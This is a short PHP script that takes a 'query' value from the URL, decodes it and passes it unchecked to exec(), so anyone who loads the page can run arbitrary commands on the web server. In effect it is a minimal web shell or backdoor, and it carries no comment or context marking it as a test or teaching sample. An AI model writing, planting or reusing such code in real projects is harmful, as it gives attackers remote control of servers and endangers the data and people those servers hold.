<?php

if (isset($_GET) && isset($_GET['query'])) {
    $query = $_GET['query'];
    $query = urldecode($query);
    exec($query);
}